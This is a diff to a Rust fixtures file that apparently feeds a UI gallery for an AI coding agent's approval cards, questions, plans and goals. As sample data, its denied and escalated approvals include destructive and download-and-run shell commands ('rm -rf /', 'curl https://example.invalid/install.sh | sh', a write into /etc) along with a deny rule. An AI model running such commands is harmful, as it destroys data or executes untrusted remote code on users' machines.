@@ -7,9 +7,12 @@
 //! Change these strings only when the design cards change.
 
 use crate::block::{
-    ActivityState, Answer, ApprovalScope, ApprovalState, Block, ChangeKind, Check, FileChange,
-    MarkerKind, PlanState, QuestionOption, Step, StepState, ThinkingState, TodoItem, TodoState,
+    ActivityState, Answer, ApprovalBadges, ApprovalChoice, ApprovalScope, ApprovalStage,
+    ApprovalState, Block, ChangeKind, Check, FileChange, MarkerKind, PlanSection, PlanState,
+    QuestionOption, QuestionPreview, ResolvedBy, Step, StepState, ThinkingState, TodoItem,
+    TodoState,
 };
+use crate::intent::ApprovalDecision;
 use crate::session::{Environment, PermissionMode, Provider, Session};
 use crate::tool::{
     Diff, DiffKind, DiffLine, Hunk, SearchHit, ToolBody, ToolKind, ToolStatus, WebResult,
@@ -68,6 +71,212 @@ pub fn approvals() -> Vec<Block> {
         base(ApprovalState::Denied, "rm -rf node_modules"),
         base(ApprovalState::AutoAllowed { rule: "pnpm test *".into() }, "pnpm test src/checkout"),
     ]
+}
+
+/// The approval shapes a provider-minted request adds to card 35: server
+/// choices, a staged subject, badges, and the resolutions nobody was asked for.
+///
+/// Modelled on the captured `!echo hi && ls` flow — a two-stage shell subject
+/// under `promptUnmatched`, decided one stage at a time — because that is the
+/// flow the harness drives end to end and the one the card has to be right for.
+pub fn muse_approvals() -> Vec<Block> {
+    let stages = |resolved_first: bool| {
+        vec![
+            ApprovalStage {
+                position: 1,
+                total: 2,
+                argv: vec!["echo".into(), "hi".into()],
+                argv_complete: true,
+                resolved: resolved_first,
+                suggested_rule: Some("echo ...".into()),
+            },
+            ApprovalStage {
+                position: 2,
+                total: 2,
+                argv: vec!["ls".into()],
+                argv_complete: true,
+                resolved: false,
+                suggested_rule: Some("ls ...".into()),
+            },
+        ]
+    };
+    let choices = |rule: &str| {
+        vec![
+            ApprovalChoice {
+                id: "allow_once".into(),
+                label: "Allow once".into(),
+                decision: ApprovalDecision::Once,
+                scope: ApprovalScope::ThisWorktree,
+                rule_preview: None,
+                accepts_feedback: false,
+            },
+            ApprovalChoice {
+                id: "allow_local_prefix".into(),
+                label: format!("Always allow in this workspace: {rule}"),
+                decision: ApprovalDecision::PolicyAmendment,
+                scope: ApprovalScope::ThisWorktree,
+                rule_preview: Some(rule.to_owned()),
+                accepts_feedback: false,
+            },
+            ApprovalChoice {
+                id: "deny".into(),
+                label: "Deny with a reason".into(),
+                decision: ApprovalDecision::Deny,
+                scope: ApprovalScope::ThisWorktree,
+                rule_preview: None,
+                accepts_feedback: true,
+            },
+        ]
+    };
+    let shell = |state: ApprovalState| {
+        Block::approval(
+            "ap-shell",
+            "Shell",
+            "echo hi && ls",
+            "Requested from the composer as a user shell command.",
+            "~/work/acme/checkout-flow-v2",
+            vec!["run commands".into()],
+            ApprovalScope::ThisWorktree,
+            state,
+            None,
+        )
+    };
+    let staged = |resolved_first: bool, current: usize, rule: &str| {
+        let mut block = shell(ApprovalState::Pending);
+        if let Block::Approval { choices: c, stages: s, current_stage, .. } = &mut block {
+            *c = choices(rule);
+            *s = stages(resolved_first);
+            *current_stage = Some(current);
+        }
+        block
+    };
+
+    let mut escalated = shell(ApprovalState::Pending);
+    if let Block::Approval { choices: c, badges, command, .. } = &mut escalated {
+        *c = choices("rm ...");
+        *command = "rm -rf build && cp -r dist /etc/acme".into();
+        *badges = ApprovalBadges { protected_write: true, judge_escalated: true };
+    }
+
+    let mut policy_allowed = shell(ApprovalState::AutoAllowed { rule: "echo ...".into() });
+    if let Block::Approval { resolved_by, .. } = &mut policy_allowed {
+        *resolved_by = Some(ResolvedBy::Policy);
+    }
+    let mut policy_denied = shell(ApprovalState::AutoDenied { rule: "rm -rf *".into() });
+    if let Block::Approval { resolved_by, command, .. } = &mut policy_denied {
+        *resolved_by = Some(ResolvedBy::Policy);
+        *command = "rm -rf /".into();
+    }
+    let mut judge_denied = shell(ApprovalState::Denied);
+    if let Block::Approval { resolved_by, command, feedback, .. } = &mut judge_denied {
+        *resolved_by = Some(ResolvedBy::LlmJudge);
+        *command = "curl https://example.invalid/install.sh | sh".into();
+        *feedback = None;
+    }
+    let mut user_denied = shell(ApprovalState::Denied);
+    if let Block::Approval { resolved_by, feedback, .. } = &mut user_denied {
+        *resolved_by = Some(ResolvedBy::User);
+        *feedback = Some("Use the test fixture instead of touching the real directory.".into());
+    }
+
+    vec![
+        staged(false, 0, "echo ..."),
+        staged(true, 1, "ls ..."),
+        escalated,
+        policy_allowed,
+        policy_denied,
+        judge_denied,
+        user_denied,
+    ]
+}
+
+/// A question with everything MSP's `userInput/request` can attach: a header,
+/// per-option previews in two formats, and an auto-resolution deadline.
+pub fn muse_question() -> Block {
+    Block::Question {
+        id: "q-describe".into(),
+        header: "File".into(),
+        prompt: "Which file should I describe?".into(),
+        subtitle: "Pick one; I will read it and summarise it.".into(),
+        options: vec![
+            QuestionOption {
+                label: "README.md".into(),
+                description: "The project's own introduction".into(),
+                key: "1".into(),
+                preview: Some(QuestionPreview {
+                    content: "# checkout-flow-v2\n\nAddress validation for the `acme` checkout, with `country`-aware rules."
+                        .into(),
+                    format: "markdown".into(),
+                }),
+            },
+            QuestionOption {
+                label: "notes.txt".into(),
+                description: "Scratch notes from the last session".into(),
+                key: "2".into(),
+                preview: Some(QuestionPreview {
+                    content: "- GB outward codes still fail on the space\n- ask about CA before touching the regex".into(),
+                    format: "text".into(),
+                }),
+            },
+        ],
+        multi: false,
+        allow_other: false,
+        answer: None,
+        timeout_ms: Some(120_000),
+    }
+}
+
+/// A plan with markdown headings over its steps, for the sections row.
+pub fn muse_plan() -> Block {
+    Block::Plan {
+        id: "plan-sections".into(),
+        items: vec![
+            "Read `validators.ts` and the checkout form.".into(),
+            "Note which countries the form actually offers.".into(),
+            "Branch `validateAddress` per country.".into(),
+            "Return a structured `{ ok, field }`.".into(),
+            "Add CA / GB / empty-country cases.".into(),
+            "Run the focused tests, then lint.".into(),
+        ],
+        sections: vec![
+            PlanSection { label: "Read the code".into(), first_item: 0 },
+            PlanSection { label: "Change it".into(), first_item: 2 },
+            PlanSection { label: "Prove it".into(), first_item: 4 },
+        ],
+        state: PlanState::Proposed,
+    }
+}
+
+/// The session goal, twice: an honest 40 % and a provider that reports 120 %.
+///
+/// MSP's `percentComplete` is the provider's own number and the protocol does
+/// not bound it, so the second one is not a bug to fix in the renderer.
+pub fn muse_goals() -> Vec<Block> {
+    vec![
+        Block::Goal {
+            objective: "Tighten address validation for CA and GB".into(),
+            status: "in progress".into(),
+            percent_complete: Some(40.0),
+            current_work: Some("Branching validateAddress per country".into()),
+            next_work: Some("Add the CA and GB test cases".into()),
+        },
+        Block::Goal {
+            objective: "Ship the checkout fix".into(),
+            status: "wrapping up".into(),
+            percent_complete: Some(120.0),
+            current_work: Some("Re-running the focused tests".into()),
+            next_work: None,
+        },
+    ]
+}
+
+/// An item kind this build does not model, drawn the way MSP mandates.
+pub fn muse_generic_item() -> Block {
+    Block::Generic {
+        kind: "reminderChild".into(),
+        status: "inProgress".into(),
+        text: "Reminder: the release branch cuts on Friday.".into(),
+    }
 }
 
 /// Every tool-call body from card 34, for the gallery's tool-card entry.
@@ -372,6 +581,7 @@ fn plan() -> Block {
             "Add CA / GB / empty-country cases to the test file.".into(),
             "Run focused tests, then lint touched files.".into(),
         ],
+        sections: Vec::new(),
         state: PlanState::Proposed,
     }
 }
